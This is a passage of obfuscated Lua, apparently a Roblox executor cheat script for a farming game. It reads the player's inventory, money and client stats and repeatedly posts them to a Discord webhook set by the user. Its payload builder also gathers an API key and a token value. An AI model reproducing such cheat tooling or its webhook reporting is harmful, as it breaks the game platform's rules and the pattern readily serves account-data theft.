		if Z.GearData and type(Z.GearData.GetGearStockCurrent) == "function" then
			local V = Z.GearData.GetGearStockCurrent(G)
			return tonumber(V) or 0
		end
		if not y.GearShop or not y.GearShop.Items then
			return 0
		end
		local V = y.GearShop.Items:FindFirstChild(G)
		if not V then
			return 0
		end
		return tonumber(V.Value) or 0
	end,
	GetSeedsGameApi = function()
		local G = {}
		local V = Z.DataReplica.GetData("Inventory")
		local y = type(V) == "table" and V.Seeds or nil
		if type(y) ~= "table" then
			return G
		end
		for V, y in pairs(y) do
			V = tostring(V or "")
			y = math.max(math.floor(tonumber(y) or 0), 0)
			if V ~= "" and y > 0 then
				local Z = g.SeedDataFast and g.SeedDataFast[V] or nil
				table.insert(G, {
					name = V;
					rarity = type(Z) == "table" and tostring(Z.rarity or "Unknown") or "Unknown";
					count = y,
					single = type(Z) == "table" and Z.single == true or false,
					icon_id = type(Z) == "table" and tonumber(Z.icon_id) or 0
				})
			end
		end
		table.sort(G, function(G, V)
			local y = g.RarityRank[tostring(G.rarity or "")] or 0
			local Z = g.RarityRank[tostring(V.rarity or "")] or 0
			if y ~= Z then
				return y > Z
			end
			if G.count ~= V.count then
				return G.count > V.count
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return G
	end,
	GetGearGameApi = function()
		local G = {}
		local V = Z.DataReplica.GetData("Inventory")
		local j = y.MailboxItemCatalog
		local i = type(j) == "table" and j.Categories or nil
		if type(V) ~= "table" or type(i) ~= "table" then
			return G
		end
		for y, i in ipairs(i) do
			i = tostring(i or "")
			if i == "" or i == "Pets" or i == "Seeds" or i == "HarvestedFruits" then
				continue
			end
			local c = V[i]
			if type(c) ~= "table" then
				continue
			end
			for V, y in pairs(c) do
				V = tostring(V or "")
				y = math.max(math.floor(tonumber(y) or 0), 0)
				if V ~= "" and y > 0 then
					local c = Z.GearData and (Z.GearData.GetGeatItemDetails and Z.GearData.GetGeatItemDetails(V)) or nil
					local J = V
					local T = type(c) == "table" and tonumber(c.icon_id) or 0
					if type(j.Resolve) == "function" then
						local G, y, Z = pcall(j.Resolve, i, V)
						if G then
							if type(y) == "string" and y ~= "" then
								J = y
							end
							if T <= 0 then
								T = q.GetAssetId(Z)
							end
						end
					end
					table.insert(G, {
						name = J,
						item_name = V,
						category = i;
						type = type(c) == "table" and tostring(c.type or i) or i,
						rarity = type(c) == "table" and tostring(c.rarity or "Unknown") or "Unknown",
						count = y,
						icon_id = T
					})
				end
			end
		end
		table.sort(G, function(G, V)
			local y = g.RarityRank[tostring(G.rarity or "")] or 0
			local Z = g.RarityRank[tostring(V.rarity or "")] or 0
			if y ~= Z then
				return y > Z
			end
			if G.count ~= V.count then
				return G.count > V.count
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return G
	end;
	GetInventoryAmountGameApi = function(G)
		local V = math.max(math.floor(tonumber(G) or 0), 0)
		return V
	end;
	RoundWeightInventoryGameApi = function(G)
		local V = tonumber(G)
		if not V then
			return 0
		end
		return math.floor(V * 100 + .5) / 100
	end,
	GetResolvedInventoryItemGameApi = function(G, V, Z)
		local j = tostring(V or "")
		local i = 0
		local c = y.MailboxItemCatalog
		if type(c) == "table" and type(c.Resolve) == "function" then
			local y, J, T = pcall(c.Resolve, G, V, Z)
			if y then
				if type(J) == "string" and J ~= "" then
					j = J
				end
				i = q.GetAssetId(T)
			end
		end
		return j, i
	end,
	GetResolvedInventoryRarityGameApi = function(G, V, j)
		if G == "Seeds" then
			local G = nil
			if type(g.SeedDataFast) == "table" then
				G = g.SeedDataFast[V]
			end
			if type(G) == "table" then
				return tostring(G.rarity or "Unknown")
			end
		end
		if G == "Pets" then
			local G = V
			if type(j) == "table" then
				G = j.Name or j.PetName or j.Species or V
			end
			local Z = nil
			if type(y.PetData) == "table" then
				Z = y.PetData[G]
			end
			if type(Z) == "table" then
				return tostring(Z.Rarity or "Unknown")
			end
		end
		local i = y.MailboxItemCatalog
		if type(i) == "table" and type(i.ResolveRarity) == "function" then
			local y, Z = pcall(i.ResolveRarity, G, V)
			if y and (type(Z) == "string" and Z ~= "") then
				return Z
			end
		end
		local c = nil
		if Z.GearData and type(Z.GearData.GetGeatItemDetails) == "function" then
			c = Z.GearData.GetGeatItemDetails(V)
		end
		if type(c) == "table" then
			return tostring(c.rarity or "Unknown")
		end
		return "Unknown"
	end;
	GetFruitVariantInventoryGameApi = function(G, V)
		if type(G) == "table" then
			local V = G.Variant or G.FruitVariant or G.Type
			if V == "Gold" or V == "Rainbow" then
				return V
			end
		end
		V = tostring(V or "")
		if V:find("Rainbow", 1, true) then
			return "Rainbow"
		end
		if V:find("Gold", 1, true) then
			return "Gold"
		end
		return "Normal"
	end;
	AddStackInventoryItemGameApi = function(G, V, y, j)
		y = tostring(y or "")
		j = Z.GameApi.GetInventoryAmountGameApi(j)
		if V == "" or y == "" or j <= 0 then
			return false
		end
		local i, c = Z.GameApi.GetResolvedInventoryItemGameApi(V, y, nil)
		local J = {
			name = y;
			display_name = i,
			amount = j,
			icon_id = c;
			rarity = Z.GameApi.GetResolvedInventoryRarityGameApi(V, y, nil)
		}
		if V == "Seeds" then
			local G = nil
			if type(g.SeedDataFast) == "table" then
				G = g.SeedDataFast[y]
			end
			if type(G) == "table" then
				J.single = G.single == true
				if c <= 0 then
					J.icon_id = tonumber(G.icon_id) or 0
				end
			end
		else
			local G = nil
			if Z.GearData and type(Z.GearData.GetGeatItemDetails) == "function" then
				G = Z.GearData.GetGeatItemDetails(y)
			end
			if type(G) == "table" then
				J.type = tostring(G.type or V)
				if c <= 0 then
					J.icon_id = tonumber(G.icon_id) or 0
				end
			end
		end
		table.insert(G[V], J)
		return true
	end;
	AddPetInventoryItemGameApi = function(G, V, j)
		if type(j) ~= "table" or j.Id == nil then
			return false
		end
		local i = j.Name or j.PetName or j.Species
		if type(i) ~= "string" or i == "" then
			return false
		end
		local c = nil
		if type(y.PetData) == "table" then
			c = y.PetData[i]
		end
		local J = type(c) == "table" and tostring(c.DisplayName or i) or i
		local T, d = Z.GameApi.GetResolvedInventoryItemGameApi("Pets", i, j)
		if type(T) == "string" and T ~= "" then
			J = T
		end
		if d <= 0 then
			d = Z.GameApi.GetIconId(c)
		end
		table.insert(G.Pets, {
			key = tostring(V or "");
			id = tostring(j.Id or "");
			name = i,
			display_name = J;
			amount = 1;
			size = Z.GameApi.GetSize(j);
			variant = Z.GameApi.GetVariant(j);
			mutation = tostring(j.Mutation or ""),
			rarity = Z.GameApi.GetResolvedInventoryRarityGameApi("Pets", i, j);
			icon_id = d,
			equipped = j.Equipped == true
		})
		return true
	end;
	AddFruitInventoryItemGameApi = function(G, V, y)
		if type(y) ~= "table" or y.Id == nil then
			return false
		end
		local j = y.FruitName or y.Name
		if type(j) ~= "string" or j == "" then
			j = tostring(V or "")
		end
		if j == "" then
			return false
		end
		local i = y.Mutation or y.Mutations or ""
		if type(i) ~= "string" then
			i = ""
		end
		local c, J = Z.GameApi.GetResolvedInventoryItemGameApi("HarvestedFruits", j, y)
		local T = y.Weight or y.weight or y.KG or y.Kg
		table.insert(G.HarvestedFruits, {
			key = tostring(V or ""),
			id = tostring(y.Id or "");
			name = j,
			display_name = c;
			amount = 1,
			weight = Z.GameApi.RoundWeightInventoryGameApi(T);
			mutation = i,
			variant = Z.GameApi.GetFruitVariantInventoryGameApi(y, i);
			icon_id = J
		})
		return true
	end,
	SortInventoryRowsGameApi = function(G)
		for V, y in pairs(G) do
			if type(y) == "table" and # y == 0 then
				G[V] = nil
			elseif type(y) == "table" then
				table.sort(y, function(G, V)
					if ((tonumber(G.amount) or 0)) ~= ((tonumber(V.amount) or 0)) then
						return ((tonumber(G.amount) or 0)) > ((tonumber(V.amount) or 0))
					end
					if tostring(G.name or "") ~= tostring(V.name or "") then
						return tostring(G.name or "") < tostring(V.name or "")
					end
					return tostring(G.id or G.key or "") < tostring(V.id or V.key or "")
				end)
			end
		end
	end;
	GetInventoryDataGameApi = function()
		local G = {}
		local V = Z.DataReplica.GetData("Inventory")
		local j = y.MailboxItemCatalog
		local i = {}
		local c = {}
		local function J(V)
			V = tostring(V or "")
			if V == "" or c[V] then
				return false
			end
			c[V] = true
			table.insert(i, V)
			G[V] = {}
			return true
		end
		if type(j) == "table" and type(j.Categories) == "table" then
			for G, V in ipairs(j.Categories) do
				J(V)
			end
		end
		J("Eggs")
		J("HarvestedFruits")
		J("EmptyPots")
		if type(V) == "table" then
			for G in pairs(V) do
				J(G)
			end
		end
		if type(V) ~= "table" then
			return G
		end
		for y, j in ipairs(i) do
			if j == "HarvestedFruits" then
				local V = Z.Mail
				if type(V) == "table" and type(V.GetBackpackMailFruits) == "function" then
					for V, y in ipairs(V.GetBackpackMailFruits()) do
						if type(y) ~= "table" then
							continue
						end
						local j = y.data
						if type(j) ~= "table" then
							j = {}
						end
						Z.GameApi.AddFruitInventoryItemGameApi(G, y.key, {
							Id = y.id;
							FruitName = y.name;
							Weight = y.weight;
							Mutation = j.m;
							Variant = j.v
						})
					end
				end
				continue
			end
			if j == "EmptyPots" then
				local V = Z.Mail
				if type(V) == "table" and type(V.GetBackpackEmptyPotCountsMail) == "function" then
					for V, y in pairs(V.GetBackpackEmptyPotCountsMail()) do
						Z.GameApi.AddStackInventoryItemGameApi(G, "EmptyPots", V, y)
					end
				end
				continue
			end
			local i = V[j]
			if type(i) ~= "table" then
				continue
			end
			if j == "Pets" then
				for V, y in pairs(i) do
					Z.GameApi.AddPetInventoryItemGameApi(G, V, y)
				end
			else
				for V, y in pairs(i) do
					Z.GameApi.AddStackInventoryItemGameApi(G, j, V, y)
				end
			end
		end
		Z.GameApi.SortInventoryRowsGameApi(G)
		return G
	end,
	GetIconId = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = tostring(G.Image or "")
		return tonumber(V:match("%d+")) or 0
	end,
	GetSize = function(G)
		if type(G) ~= "table" then
			return "Normal"
		end
		if G.Size == "Huge" then
			return "Huge"
		end
		if G.Size == "Big" then
			return "Big"
		end
		return "Normal"
	end;
	GetVariant = function(G)
		if type(G) == "table" and G.Type == "Rainbow" then
			return "Rainbow"
		end
		return "Normal"
	end;
	GetPets = function()
		local G = Z.DataReplica.GetData("Inventory")
		local V = type(G) == "table" and G.Pets or nil
		if type(V) ~= "table" then
			return nil
		end
		local j = {}
		local i = {}
		for G, V in pairs(V) do
			if type(V) ~= "table" then
				continue
			end
			local i = V.Name or V.PetName or V.Species
			if type(i) ~= "string" or i == "" then
				continue
			end
			local c = type(y.PetData) == "table" and y.PetData[i] or nil
			local J = type(c) == "table" and c.DisplayName or i
			local T = type(c) == "table" and c.Rarity or "Unknown"
			local d = Z.GameApi.GetSize(V)
			local u = Z.GameApi.GetVariant(V)
			local q = table.concat({
				i,
				d,
				u
			}, "\031")
			if not j[q] then
				j[q] = {
					name = tostring(J),
					size = d,
					variant = u,
					rarity = tostring(T);
					amount = 0;
					icon_id = Z.GameApi.GetIconId(c)
				}
			end
			j[q].amount += 1
		end
		for G, V in pairs(j) do
			table.insert(i, V)
		end
		table.sort(i, function(G, V)
			if G.name ~= V.name then
				return G.name < V.name
			end
			if G.size ~= V.size then
				return G.size < V.size
			end
			return G.variant < V.variant
		end)
		return i
	end;
	BuildPayload = function()
		local G = Z.GameApi.GetPets()
		if type(G) ~= "table" then
			return nil
		end
		local V = y.LocalPlayer
		if not V or not V.UserId then
			return nil
		end
		local j = abdsjdsiewjewjejskdskdksdkskdlereir or 9
		local i = Z.GameApi.GetInventoryDataGameApi()
		local c = tostring(h.web_api_key or "")
		return {
			game = "gag2",
			webapi = c,
			username = tostring(V.Name or "");
			userid = tostring(V.UserId),
			ispro = g.GetCheckIfPro() == true;
			sheckles = tostring(Z.Money.GetSheckles() or 0),
			pets_data = G,
			seeds_data = Z.GameApi.GetSeedsGameApi();
			gear_data = Z.GameApi.GetGearGameApi();
			inventory_data = i;
			runtime = Z.RuntimeStats.BuildPayloadRuntimeStats();
			sc_v = tostring(y.CurentV),
			user_tokens = tostring(j)
		}
	end;
	Send = function()
		if Z.GameApi.Busy then
			return false
		end
		local G = Z.GameApi.BuildPayload()
		if type(G) ~= "table" then
			return false
		end
		Z.GameApi.Busy = true

		-- WEBHOOK CONFIGURATION:
		local TargetWebhook = (X.webhook_url ~= "") and X.webhook_url or "YOUR_DEDICATED_DISCORD_WEBHOOK_HERE"

		-- Cancel the send operation if no valid URL is found
		if not TargetWebhook or TargetWebhook == "" or not TargetWebhook:match("^https?://") then
			Z.GameApi.Busy = false
			return false
		end

		-- Clean up the webhook URL to ensure proper formatting for API calls
		local baseUrl = TargetWebhook:gsub("%?.*$", ""):gsub("/+$", "")

		-- Local Storage Helpers for persisting the Message ID across rejoins
		-- FIXED: Changed 'q.player_userid' to 'g.player_userid' so each account gets its own file
		local storageFile = "exotichub99/msg_" .. tostring(g.player_userid or "global") .. ".txt"
		
		local function saveMessageId(msgId)
			if type(writefile) == "function" then
				pcall(writefile, storageFile, tostring(msgId or ""))
			end
		end

		local function loadMessageId()
			if type(readfile) == "function" and type(isfile) == "function" and isfile(storageFile) then
				local success, content = pcall(readfile, storageFile)
				if success and type(content) == "string" then
					content = content:match("^%s*(.-)%s*$")
					return content ~= "" and content or nil
				end
			end
			return nil
		end

		-- Initialize the session variable from local disk if it's currently empty
		if not Z.GameApi.LastMessageId then
			Z.GameApi.LastMessageId = loadMessageId()
		end

		-- Helper function to map the stats into a clean, compact Discord layout
		local function BuildDiscordPayload(payload)
			
			-- Standard UI Emojis (Defaults can still be edited here if desired)
			local Emojis = {
				Title       = "📊", 
				Player      = "👤", 
				Money       = "💰", 
				Script      = "🤖", 
				Performance = "⚙️", 
				Atmosphere  = "🌍", 
				Pets        = "🐾", 
				Seeds       = "🌱", 
				Gear        = "🎒"  
			}

			-- Custom Seed Emoji Mapping Table (including Gold, Rainbow, Mega, and custom high-value seeds)
			local SeedEmojis = {
				["Hypno Bloom"] = "<:hypnobloom:1520651941351526500>",
				["Dragon's Breath"] = "<:dragonsbreath:1520341335780098160>",
				["Moon Bloom"] = "<:moonbloom:1520341284546547813>",
				["Gold Seed"] = "<:GoldSeed:1517928796949577908>",
				["Gold"] = "<:GoldSeed:1517928796949577908>",
				["Rainbow Seed"] = "<:RainbowSeed:1517928781455560714>",
				["Rainbow"] = "<:RainbowSeed:1517928781455560714>",
				["Mega Seed"] = "<:MegaSeed:1524387446803009658>",
				["Mega"] = "<:MegaSeed:1524387446803009658>",
				["Venom Spitter"] = "<:VenomSpitterSeed:1524393516032331887>",
				["Venus Fly Trap"] = "<:VenusFlyTrapSeed:1524393484285382729>",
				["Ghost Pepper"] = "<:GhostPepperSeed:1524393591676473435>",
				["Poison Apple"] = "<:PoisonAppleSeed:1524393566829547590>",
				["Pomegranate"] = "<:PomegranateSeed:1524393543764934736>"
			}

			-- Custom Pet Emoji Mapping Table (including Unicorn, Dragonfly, Raccoon, Ice Serpent, Black Dragon, Bear, and Bald Eagle)
			local PetEmojis = {
				["Unicorn"] = "<:1515268308633391207:1520052828268269621>",
				["Golden Dragonfly"] = "<:1515424090532610180:1515758935867654204>",
				["Raccoon"] = "<:raccoon:1373885770774876224>",
				["Ice Serpent"] = "<:iceserpent:1524382567099269294>",
				["Black Dragon"] = "<:blackdragon:1524382547532972246>",
				["Bear"] = "<:bear:1524382526905258146>",
				["Bald Eagle"] = "<:baldeagle:1524382505422028800>"
			}

			-- Custom Gear Emoji Mapping Table (Super Watering Can & Super Sprinkler)
			local GearEmojis = {
				["Super Watering Can"] = "<:SuperWateringCan:1515091679605162094>",
				["Super Sprinkler"] = "<:SuperSprinkler1:1515093194554085547>"
			}

			-- Helper function to check if the item rarity matches "Super" or "Mythic"
			local function isTargetRarity(rarity)
				if type(rarity) ~= "string" then return false end
				local r = rarity:lower()
				return r == "super" or r == "mythic"
			end

			-- Custom Moon & Weather Emoji Formatting Helper
			local function formatWorldValue(val)
				if not val or val == "" then return "None" end
				local lowerVal = val:lower():gsub("%s+", "")
				if lowerVal == "megamoon" or lowerVal == "megaphase" then
					return "<:megamoon:1520395637017935993> **" .. val .. "**"
				elseif lowerVal == "goldmoon" or lowerVal == "gold" then
					return "<:goldmoon:1520347271798063114> **" .. val .. "**"
				elseif lowerVal == "rainbowmoon" or lowerVal == "rainbow" then
					return "<:rainbow:1520347453566750810> **" .. val .. "**"
				elseif lowerVal == "bloodmoon" or lowerVal == "blood" then
					return "<:bloodmoon:1520347227095175209> **" .. val .. "**"
				elseif lowerVal == "day" or lowerVal == "dayweather" then
					return "<:DayWeather:1524414445424611368> **" .. val .. "**"
				elseif lowerVal == "sunset" or lowerVal == "sunsetweather" then
					return "<:SunsetWeather:1524414424918655126> **" .. val .. "**"
				elseif lowerVal == "night" or lowerVal == "moon" or lowerVal == "normalmoon" or lowerVal == "nightweather" then
					return "<:NightWeather:1524414406505795704> **" .. val .. "**"
				end
				return "**" .. val .. "**"
			end

			-- Custom fail-proof formatting helper function
			local function FormatMoneyInline(val)
				local n = tonumber(val)
				if not n then return "0" end
				if n < 1000 then
					return tostring(math.floor(n))
				end
				local suffixes = { "k", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
				local index = 0
				local num = n
				while num >= 1000 and index < #suffixes do
					num = num / 1000
					index = index + 1
				end
				local formatted = string.format("%.2f", num)
				formatted = formatted:gsub("%.?0+$", "") -- Clean up trailing zeros (e.g. 1.00 -> 1)
				return formatted .. suffixes[index]
			end

			local username = payload.username or "Unknown"
			local userid = payload.userid or "Unknown"
			local sheckles = payload.sheckles or "0"
			local sc_v = payload.sc_v or "Unknown"
			
			-- FIXED: Calls the inline formatter to handle formatting 100% reliably
			local formattedSheckles = FormatMoneyInline(sheckles)

			local runtime = payload.runtime or {}
			local fps = runtime.fps or 0
			local ping = runtime.ping_ms or 0
			local ram = runtime.ram_mb or 0
			local uptime = runtime.uptime_s or 0
			local weather = runtime.active_weather or "None"
			local phase = runtime.active_phase or "None"

			-- Format Uptime into dynamic hours/minutes
			local hours = math.floor(uptime / 3600)
			local minutes = math.floor((uptime % 3600) / 60)
			local uptimeStr = string.format("%dh %dm", hours, minutes)

			-- Format the World indicators using the custom Moon/Weather mapping function
			local formattedWeather = formatWorldValue(weather)
			local formattedPhase = formatWorldValue(phase)

			-- Compact Description Block with Custom Emoji mapping
			local description = table.concat({
				string.format("> %s **Player:** %s (`%s`)", Emojis.Player, username, userid),
				string.format("> %s **Money:** **$%s**", Emojis.Money, formattedSheckles),
				string.format("> %s **Script:** Version `%s`", Emojis.Script, sc_v),
				"> ",
				string.format("> %s **Client:** `%s` uptime • `%d` FPS • `%dms` Ping • `%.1fMB` RAM", Emojis.Performance, uptimeStr, fps, ping, ram),
				string.format("> %s **World:** %s (%s Phase)", Emojis.Atmosphere, formattedWeather, formattedPhase)
			}, "\n")

			-- Formatter to display lists vertically, one item per line
			local function formatVerticalList(rawList, maxVisible)
				if #rawList == 0 then return nil end
				local visible = {}
				for i = 1, math.min(#rawList, maxVisible) do
					table.insert(visible, "• " .. rawList[i])
				end
				local result = table.concat(visible, "\n")
				if #rawList > maxVisible then
					result = result .. string.format("\n• *...and %d more items*", #rawList - maxVisible)
				end
				return result
			end

			-- Compile Pets with "Super" or "Mythic" filter and expanded PetEmojis mappings
			local petsList = {}
			if type(payload.pets_data) == "table" then
				for _, pet in ipairs(payload.pets_data) do
					if isTargetRarity(pet.rarity) then
						local sizeStr = (pet.size and pet.size ~= "Normal") and (pet.size .. " ") or ""
						local varStr = ""
						if pet.variant == "Rainbow" then
							varStr = "<:rainbow:1520347453566750810> "
						elseif pet.variant and pet.variant ~= "Normal" then
							varStr = pet.variant .. " "
						end
						
						-- Match against display name or internal name
						local petEmoji = PetEmojis[pet.name] or PetEmojis[pet.display_name] or ""
						local prefix = petEmoji ~= "" and (petEmoji .. " ") or ""
						
						table.insert(petsList, string.format("%s**x%d** %s%s%s (%s)", prefix, pet.amount or 1, sizeStr, varStr, pet.name, pet.rarity))
					end
				end
			end
			local petsStr = formatVerticalList(petsList, 15)

			-- Compile Seeds (Accepts "Super", "Mythic", or name patterns containing Gold, Rainbow, or Mega)
			local seedsList = {}
			if type(payload.seeds_data) == "table" then
				for _, seed in ipairs(payload.seeds_data) do
					local sName = seed.name or ""
					local sRarity = seed.rarity or "Unknown"
					local lowerName = sName:lower()

					if isTargetRarity(sRarity) or lowerName:find("gold") or lowerName:find("rainbow") or lowerName:find("mega") then
						local seedEmoji = SeedEmojis[sName] or ""
						local prefix = seedEmoji ~= "" and (seedEmoji .. " ") or ""
						table.insert(seedsList, string.format("%s**x%d** %s (%s)", prefix, seed.count or 1, sName, sRarity))
					end
				end
			end
			local seedsStr = formatVerticalList(seedsList, 15)

			-- Compile Gear with "Super" or "Mythic" filter and Super Watering Can/Sprinkler mappings
			local gearList = {}
			if type(payload.gear_data) == "table" then
				for _, gear in ipairs(payload.gear_data) do
					if isTargetRarity(gear.rarity) then
						local gearEmoji = GearEmojis[gear.name] or GearEmojis[gear.item_name] or ""
						local prefix = gearEmoji ~= "" and (gearEmoji .. " ") or ""
						table.insert(gearList, string.format("%s**x%d** %s (%s)", prefix, gear.count or 1, gear.name, gear.rarity))
					end
				end
			end
			local gearStr = formatVerticalList(gearList, 15)

			-- Add sections as fields dynamically (only shows up if there is at least one match)
			local fields = {}
			if petsStr then
				table.insert(fields, { name = Emojis.Pets .. "Pets In Inventory", value = petsStr, inline = false })
			end
			if seedsStr then
				table.insert(fields, { name = Emojis.Seeds .. "Seeds In Inventory", value = seedsStr, inline = false })
			end
			if gearStr then
				table.insert(fields, { name = Emojis.Gear .. "Gear & Tools", value = gearStr, inline = false })
			end

			return {
				username = "I see you.",
				embeds = {
					{
						title = Emojis.Title .. " Account Stats",
						description = description,
						color = 3092790, -- Dark Theme
						fields = fields,
						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
					}
				}
			}
		end

		local discordPayload = BuildDiscordPayload(G)

		local V = pcall(function()
			local encodedData = y.HttpService:JSONEncode(discordPayload)
			local reqFunc = r.Http.GetRequestFunction()
			
			if type(reqFunc) == "function" then
				local requestSuccess = false

				-- 1. Attempt to edit the previous message if its ID is stored
				if Z.GameApi.LastMessageId then
					local patchUrl = baseUrl .. "/messages/" .. Z.GameApi.LastMessageId
					local response = reqFunc({
						Url = patchUrl,
						Method = "PATCH",
						Headers = { ["Content-Type"] = "application/json" },
						Body = encodedData
					})
					
					if type(response) == "table" then
						local status = tonumber(response.StatusCode or response.Status or response.status_code) or 0
						if status >= 200 and status < 300 then
							requestSuccess = true
						else
							-- If the edit fails (e.g., message was manually deleted on Discord), reset local variables & storage
							Z.GameApi.LastMessageId = nil
							saveMessageId("")
						end
					end
				end

				-- 2. If no message ID exists or editing failed, send a new message and capture its ID
				if not requestSuccess then
					local postUrl = baseUrl .. "?wait=true"
					local response = reqFunc({
						Url = postUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = encodedData
					})

					if type(response) == "table" then
						local responseBody = tostring(response.Body or response.body or "")
						local status = tonumber(response.StatusCode or response.Status or response.status_code) or 0
						if status >= 200 and status < 300 then
							local decoded
							pcall(function()
								decoded = y.HttpService:JSONDecode(responseBody)
							end)
							if type(decoded) == "table" and decoded.id then
								local newId = tostring(decoded.id)
								Z.GameApi.LastMessageId = newId
								saveMessageId(newId) -- Save to local disk for persistence
							end
						end
					end
				end
			else
				-- Fallback standard Roblox HttpService (POST only, cannot perform custom PATCH requests)
				y.HttpService:PostAsync(baseUrl, encodedData, Enum.HttpContentType.ApplicationJson)
			end
		end)

		Z.GameApi.Busy = false
		return V
	end,
	Start = function()
		if Z.GameApi.Started then
			return
		end
		Z.GameApi.Started = true
		task.spawn(function()
			task.wait(2)
			while true do
				Z.GameApi.Send()
				task.wait(Z.GameApi.GetInterval())
			end
		end)
	end
}
local t = type(getgenv) == "function" and getgenv() or _G
t.__exo_guard_claims_pro = false
if type(g) == "table" and type(g.GetCheckIfPro) == "function" then
	t.__exo_guard_claims_pro = g.GetCheckIfPro() == true
end
Z.Data = {
	GetRarityColor = function(G)
		local V = "#FFFFFF"
		local Z = y and y.RarityVisuals
		if type(Z) ~= "table" or type(Z.GetStaticColor) ~= "function" or type(G) ~= "string" or G == "" then
			return V
		end
		local j = Z.GetStaticColor(G)
		if typeof(j) ~= "Color3" then
			return V
		end
		local i = math.clamp(math.floor(j.R * 255 + .5), 0, 255)
		local c = math.clamp(math.floor(j.G * 255 + .5), 0, 255)
		local J = math.clamp(math.floor(j.B * 255 + .5), 0, 255)
		return string.format("#%02X%02X%02X", i, c, J)
	end
}
g.AllMutationNames = {}
Z.Mutations = {
	Load = function()
		table.clear(g.AllMutationNames)
		local G = y.MutationDataModule
		local V = y.MutationData
		if not G then
			return false
		end
		if type(V) ~= "table" or type(V.GetMutation) ~= "function" then
			return false
		end
		local Z = {}
		for G, y in ipairs(G:GetChildren()) do
			if not y:IsA("ModuleScript") then
				continue
			end
			local j = y.Name
			if j == "" or Z[j] then
				continue
			end
			local i, c = pcall(function()
				return V.GetMutation(j)
			end)
			if i and type(c) == "table" then
				Z[j] = true
				table.insert(g.AllMutationNames, j)
			end
		end
		table.sort(g.AllMutationNames)
		return # g.AllMutationNames > 0
	end;
	GetNames = function()
		local G = {}
		for V, y in ipairs(g.AllMutationNames) do
			table.insert(G, y)
		end
		return G
	end
}
Z.Mutations.Load()
q.GetAssetId = function(G)
	if G == nil then
		return 0
	end
	if type(G) == "number" then
		return math.floor(G)
	end
	if typeof(G) == "Instance" then
		if G:IsA("StringValue") then
			G = G.Value
		elseif G:IsA("ImageLabel") or G:IsA("ImageButton") then
			G = G.Image
		else
			return 0
		end
	end
	G = tostring(G or "")
	if G == "" then
		return 0
	end
	return tonumber(G:match("%d+")) or 0
end
g.AllSeedsDataTable = {}
g.SeedRarity = {}
g.SeedSingleHarvest = {}
g.SeedDataFast = {}
g.SeedShopDataList = {}
g.SeedPriceOverrides = {}
Z.SeedData = {
	getCleanPriceOverrides = function()
		if type(y.SeedShopFlags) ~= "table" then
			return
		end
		local G = y.SeedShopFlags.PriceOverrides
		if type(G) == "table" and G.Value then
			G = G.Value
		end
		if type(G) == "table" then
			for G, V in pairs(G) do
				if type(G) == "string" and type(V) == "number" then
					g.SeedPriceOverrides[G] = V
				end
			end
		end
	end;
	IsSingleHarvest = function(G)
		return g.SeedSingleHarvest[G]
	end,
	LoadAllSeeds = function()
		if not y.SeedData then
			warn("Seed Data failed to load.")
			return
		end
		for G, V in ipairs(y.SeedData) do
			local y = V.SeedName
			local Z = V.SeedImage
			local j = V.FruitImage
			local i = g.SeedPriceOverrides[y] or V.PurchasePrice
			local c = V.RestockShop
			local J = V.SeedShopDisplayOrder
			local T = V.YHeight
			local d = V.RestockChance
			local u = V.RestockValues
			local E = V.IsSingleHarvest
			local a = V.Rarity
			local H = V.PrimeTime
			local r = V.PlantModel
			local Y = V.MutationSeed
			g.SeedRarity[y] = a
			if E then
				g.SeedSingleHarvest[y] = true
			end
			local e = {
				name = y,
				price = i;
				rarity = a;
				single = E;
				mutation_seed = Y == true;
				icon_id = q.GetAssetId(Z)
			}
			g.SeedDataFast[y] = e
			table.insert(g.AllSeedsDataTable, e)
		end
	end;
	GetSeedDataX = function(G)
		return g.SeedDataFast[G] or nil
	end;
	LoadValidSeedsForShop = function()
		local G = y.SeedShop.Items
		for G, V in ipairs(G:GetChildren()) do
			local y = V.Name or ""
			local Z = g.SeedDataFast[y]
			if not Z then
				print("Seed not data ", y)
				continue
			end
			g.SeedShopDataList[y] = true
		end
	end;
	GetSeedDataListDropDown = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable) do
			local j = tostring(y.name or "Unknown")
			local i = tonumber(y.price) or 0
			local c = tostring(y.rarity or "Unknown")
			local J = y.single == true
			local T = J and "Single" or "Multi"
			local d = Z.Data.GetRarityColor(c)
			local u = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#00FF00\">$%s</font> <font color=\"%s\">%s</font> <font color=\"#FFFFFF\">%s</font>", j, tostring(i), d, c, T)
			local q = {
				Text = u,
				Value = j
			}
			table.insert(G, q)
		end
		return G
	end;
	GetSeedShopDropDown = function()
		local G = {}
		for V, y in pairs(g.SeedShopDataList) do
			local j = V
			local i = g.SeedDataFast[j]
			if not i then
				print("Seed not data ", j)
				continue
			end
			local c = tostring(i.name or "Unknown")
			local J = q.formatShecklesNumber(i.price)
			local T = tostring(i.rarity or "Unknown")
			local d = i.single == true
			local u = d and "Single" or "Multi"
			local E = Z.Data.GetRarityColor(T)
			local a = string.format("<font color=\"#FFFFFF\">%s</font> <font color=\"#00FF00\">$%s</font> <font color=\"%s\">%s</font> <font color=\"#FFFFFF\">%s</font>", c, tostring(J), E, T, u)
			local H = {
				Text = a,
				Value = c
			}
			table.insert(G, H)
		end
		return G
	end
}
Z.SeedData.getCleanPriceOverrides()
Z.SeedData.LoadAllSeeds()
Z.SeedData.LoadValidSeedsForShop()
g.AllGearShopData = {}
g.AllGearShopTable = {}
Z.GearData = {
	GetPrice = function(G, V)
		local Z = y.GearShopFlags and y.GearShopFlags.PriceOverrides
		if not Z or type(Z.Get) ~= "function" then
			return V
		end
		local j = Z:Get()
		local i = type(j) == "table" and j[G]
		if type(i) == "number" and i >= 0 then
			return i
		end
		return V
	end;
	LoadAllGearData = function()
		local G = y.GearShopData
		local V = G and G.Data
		if type(V) ~= "table" then
			warn("[GearData] Gear shop data was not found")
			return false
		end
		for G, V in ipairs(V) do
			if type(V) == "table" then
				local y = V.RestockValues
				local j = G
				local i = V.ItemName
				local c = V.ItemType
				local J = V.Rarity
				local T = V.PriceInRobux
				local d = V.RestockChance
				local u = V.EquippableGear == true
				local E = V.IMG or ""
